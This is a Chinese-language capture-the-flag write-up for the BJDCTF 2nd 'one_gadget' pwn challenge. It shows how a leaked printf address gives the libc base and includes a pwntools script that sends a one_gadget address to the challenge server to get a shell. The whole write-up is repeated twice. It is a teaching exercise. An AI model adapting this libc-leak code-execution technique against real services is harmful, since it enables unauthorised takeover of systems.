---
title: One_gadget
categories: 
    - Stack
    - One_gadget
---
# One_gadget
<!--more-->
## [BJDCTF 2nd]one_gadget

ida看main函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70)
再看init函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201127174608655.png)

会输出一个printf的地址

使用one_gadget，计算一下libc的基址
buuctf给了远程的libc文件，下载下来

```python
one_gadget [libcfilename]
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70)

exp：

```python
from pwn import *
context.log_level='debug'
p=remote('node3.buuoj.cn',25812)

libc=ELF('./libc-2.29.so')

p.recvuntil('0x')
printf_addr = int(p.recv(12),16)

libc_base = printf_addr - libc.symbols['printf']
one_gadget = 0x106ef8
payload = libc_base + one_gadget

p.recvuntil('Give me your one gadget:')
p.sendline(str(payload))
p.interactive()

```

[BJDCTF 2nd]one_gadget
ida看main函数

在这里插入图片描述
再看init函数

在这里插入图片描述

会输出一个printf的地址

使用one_gadget，计算一下libc的基址
buuctf给了远程的libc文件，下载下来

one_gadget [libcfilename]
在这里插入图片描述

exp：

```py
from pwn import *
context.log_level='debug'
p=remote('node3.buuoj.cn',25812)

libc=ELF('./libc-2.29.so')

p.recvuntil('0x')
printf_addr = int(p.recv(12),16)

libc_base = printf_addr - libc.symbols['printf']
one_gadget = 0x106ef8
payload = libc_base + one_gadget

p.recvuntil('Give me your one gadget:')
p.sendline(str(payload))
p.interactive()

```
